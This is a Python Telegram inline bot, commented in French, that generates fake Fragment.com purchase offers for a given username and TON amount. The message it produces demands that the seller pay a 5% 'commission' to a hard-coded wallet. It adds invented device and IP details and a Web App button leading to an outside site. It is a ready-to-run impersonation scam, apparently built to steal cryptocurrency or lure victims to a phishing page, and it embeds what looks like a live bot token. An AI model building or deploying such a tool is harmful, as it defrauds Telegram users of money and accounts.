import os
import time
import urllib.request
import json
import asyncio
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import threading
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, MessageEntity, WebAppInfo
from telegram.ext import Application, InlineQueryHandler, ContextTypes

# Configuration
BOT_TOKEN = '7975400880:AAFMJ5ya_sMdLLMb7OjSbMYiBr3IhZikE6c'
PORT = int(os.getenv('PORT', 10000))
WEBHOOK_URL = "https://telegram-bot-vic3.onrender.com"
WEBAPP_URL = "https://myminiapp.onrender.com"  # 🔗 URL de votre site web

print(f"🤖 Inline Fragment Deal Generator v4.7")
print(f"🔑 Token: ✅")
print(f"🌐 Port: {PORT}")
print(f"🔗 Webhook: {WEBHOOK_URL}")
print(f"📱 Web App: {WEBAPP_URL}")

# Variables globales
app = None
event_loop = None

def get_ton_price():
    """Récupère le prix actuel du TON depuis CoinGecko avec API de secours"""
    try:
        # API principale : CoinGecko
        with urllib.request.urlopen('https://api.coingecko.com/api/v3/simple/price?ids=the-open-network&vs_currencies=usd', timeout=5) as response:
            data = json.loads(response.read().decode())
            return data['the-open-network']['usd']
    except:
        try:
            # API de secours : CoinMarketCap (gratuite)
            with urllib.request.urlopen('https://api.coinlore.net/api/ticker/?id=54683', timeout=5) as response:
                data = json.loads(response.read().decode())
                return float(data[0]['price_usd'])
        except:
            return 5.50  # Prix par défaut si toutes les APIs sont indisponibles

def generate_fragment_message(username, ton_amount):
    """Génère le message Fragment avec formatage identique au bot original"""
    
    # Prix TON actuel - récupération en temps réel
    ton_price = get_ton_price()
    
    # Calculs
    price = float(ton_amount)
    price_usd = price * ton_price
    commission = price * 0.05
    commission_usd = commission * ton_price
    
    # Adresse wallet
    wallet_address = "UQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XDPR"
    
    # Message Fragment - IDENTIQUE au bot original
    fragment_message = f"""We have received a purchase request for your username @{username} via Fragment.com. Below are the transaction details:

• Offer Amount: 💎{price:g} (${price_usd:.2f} USD)
• Commission: 💎{commission:g} (${commission_usd:.2f} USD)

Please note that a 5% commission is charged to the seller prior to accepting the deal. This ensures a secure and efficient transaction process.

Additional Information:
• Device: Safari on macOS  
• IP Address: 103.56.72.245
• Wallet: {wallet_address}

Important:
• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
• If you choose not to proceed, simply ignore this message."""
    
    # Création des entités pour le formatage
    entities = []
    
    # 1. Offer Amount en gras
    offer_text = f"• Offer Amount: 💎{price:g} (${price_usd:.2f} USD)"
    offer_start = fragment_message.find(offer_text)
    if offer_start != -1:
        entities.append(MessageEntity(
            type=MessageEntity.BOLD,
            offset=offer_start,
            length=len(offer_text)
        ))
    
    # 2. Commission en gras
    commission_text = f"• Commission: 💎{commission:g} (${commission_usd:.2f} USD)"
    commission_start = fragment_message.find(commission_text)
    if commission_start != -1:
        entities.append(MessageEntity(
            type=MessageEntity.BOLD,
            offset=commission_start,
            length=len(commission_text)
        ))
    
    # 3. Premier point Important en gras
    important_text1 = "• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible."
    important_start1 = fragment_message.find(important_text1)
    if important_start1 != -1:
        entities.append(MessageEntity(
            type=MessageEntity.BOLD,
            offset=important_start1,
            length=len(important_text1)
        ))
    
    # 4. Deuxième point Important en gras
    important_text2 = "• If you choose not to proceed, simply ignore this message."
    important_start2 = fragment_message.find(important_text2)
    if important_start2 != -1:
        entities.append(MessageEntity(
            type=MessageEntity.BOLD,
            offset=important_start2,
            length=len(important_text2)
        ))
    
    # 5. Wallet cliquable - LONGUEUR CORRECTE (48 caractères: UQ...PR)
    wallet_start = fragment_message.find(wallet_address)
    if wallet_start != -1:
        entities.append(MessageEntity(
            type=MessageEntity.TEXT_LINK,
            offset=wallet_start,
            length=48,  # Longueur exacte de UQ...PR (48 caractères)
            url=f"https://tonviewer.com/{wallet_address}"
        ))
        print(f"🔗 Wallet link: position {wallet_start}, longueur 48 caractères")
    
    # Clavier inline avec bouton WebApp uniquement
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("📱 Web App", web_app=WebAppInfo(url=WEBAPP_URL))]
    ])
    
    return fragment_message, entities, keyboard

async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gestionnaire des requêtes inline"""
    try:
        from telegram import InlineQueryResultArticle, InputTextMessageContent
        
        query = update.inline_query.query.strip() if update.inline_query.query else ""
        
        # Si pas de requête OU format incorrect - AUCUNE RÉPONSE (utilisation privée)
        if not query:
            await update.inline_query.answer([], cache_time=0)
            return
        
        # Parsing de la requête (username montant)
        parts = query.split()
        
        # Si format incorrect - AUCUNE RÉPONSE (utilisation privée)
        if len(parts) < 2:
            await update.inline_query.answer([], cache_time=0)
            return
        
        username = parts[0].replace('@', '')  # Supprime @ si présent
        
        try:
            ton_amount = float(parts[1])
            if ton_amount <= 0:
                raise ValueError("Montant doit être positif")
        except ValueError:
            # Si montant invalide - AUCUNE RÉPONSE (utilisation privée)
            await update.inline_query.answer([], cache_time=0)
            return
        
        # Génération du message avec le format exact du bot original
        fragment_message, entities, keyboard = generate_fragment_message(username, ton_amount)
        
        # Prix actuel pour l'affichage
        current_ton_price = get_ton_price()
        current_usd_value = ton_amount * current_ton_price
        
        # Résultat inline - SEULEMENT si format correct
        results = [
            InlineQueryResultArticle(
                id=f"deal_{username}_{ton_amount}_{int(time.time())}",
                title=f"Fragment Deal: @{username}",
                description=f"💎 {ton_amount:g} TON (${current_usd_value:.2f} USD)",
                input_message_content=InputTextMessageContent(
                    fragment_message,
                    entities=entities,
                    disable_web_page_preview=True  # ✅ DÉSACTIVE L'APERÇU DES LIENS
                ),
                reply_markup=keyboard
            )
        ]
        
        await update.inline_query.answer(results, cache_time=0)
        print(f"✅ Réponse inline envoyée: {username} - {ton_amount} TON")
        
    except Exception as e:
        print(f"❌ Erreur inline: {e}")
        # En cas d'erreur - AUCUNE RÉPONSE non plus
        await update.inline_query.answer([], cache_time=0)

async def setup_bot():
    """Configuration et démarrage du bot"""
    global app, event_loop
    
    try:
        # Configuration de l'application
        app = Application.builder().token(BOT_TOKEN).build()
        
        # Ajout du gestionnaire inline
        app.add_handler(InlineQueryHandler(inline_query_handler))
        
        # Configuration du webhook
        await app.bot.set_webhook(
            url=f"{WEBHOOK_URL}/webhook",
            allowed_updates=['inline_query']
        )
        
        print("✅ Webhook configuré")
        print("🔄 Bot en attente...")
        
        # Démarrage du serveur HTTP
        event_loop = asyncio.get_event_loop()
        server = HTTPServer(('0.0.0.0', PORT), WebhookHandler)
        
        # Serveur en thread séparé
        def run_server():
            print(f"🌐 Serveur HTTP démarré sur le port {PORT}")
            server.serve_forever()
        
        server_thread = threading.Thread(target=run_server)
        server_thread.daemon = True
        server_thread.start()
        
        # Boucle infinie pour maintenir le bot actif
        while True:
            await asyncio.sleep(1)
            
    except Exception as e:
        print(f"❌ Erreur setup: {e}")

class WebhookHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        """Gestionnaire des webhooks"""
        try:
            if self.path == '/webhook':
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                
                # Parse JSON
                update_data = json.loads(post_data.decode('utf-8'))
                update = Update.de_json(update_data, app.bot)
                
                # Traitement asynchrone
                if event_loop and not event_loop.is_closed():
                    asyncio.run_coroutine_threadsafe(
                        app.process_update(update), 
                        event_loop
                    )
                
                self.send_response(200)
                self.end_headers()
            else:
                self.send_response(404)
                self.end_headers()
                
        except Exception as e:
            print(f"❌ Erreur webhook: {e}")
            self.send_response(500)
            self.end_headers()
    
    def do_GET(self):
        """Page de status simple"""
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        
        status = f"✅ Bot Status: Online\n🕐 Time: {time.strftime('%Y-%m-%d %H:%M:%S UTC')}\n📱 Web App (Intégrée): {WEBAPP_URL}"
        self.wfile.write(status.encode('utf-8'))
    
    def log_message(self, format, *args):
        """Désactiver les logs HTTP"""
        pass

def main():
    """Fonction principale"""
    try:
        print("🚀 Démarrage du bot inline...")
        
        # Démarrage asynchrone
        asyncio.run(setup_bot())
        
    except KeyboardInterrupt:
        print("🛑 Arrêt du bot...")
    except Exception as e:
        print(f"❌ Erreur critique: {e}")

if __name__ == '__main__':
    main()
